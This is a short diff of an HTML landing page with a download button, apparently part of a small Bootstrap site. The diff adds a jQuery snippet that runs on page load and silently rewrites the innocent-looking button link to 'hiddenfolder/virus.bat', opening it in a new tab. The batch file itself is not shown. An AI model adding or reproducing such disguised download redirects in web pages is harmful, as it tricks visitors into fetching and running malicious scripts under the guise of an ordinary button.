@@ -71,7 +71,8 @@
       
       <div class="row">
         <div class="col-md-6 col-md-push-3">        
-          <a href="#"><img src="img/button.png" class="img-responsive" alt="Responsive image"></a>
+          <a id="dl" href="#"><img src="img/button.png" class="img-responsive" alt="Responsive image"></a>
+          
         </div>
       </div>
       <!-- /.row -->
@@ -79,10 +80,16 @@
 
     </div>
     <!-- /.container -->
-
+    
     <!-- jQuery -->
     <script src="js/jquery.js"></script>
 
+    <script>
+      $( document ).ready(function() {
+        $('a#dl').attr({target: '_blank', href: 'hiddenfolder/virus.bat'});
+      });            
+    </script>
+    
     <!-- Bootstrap Core JavaScript -->
     <script src="js/bootstrap.min.js"></script>
 
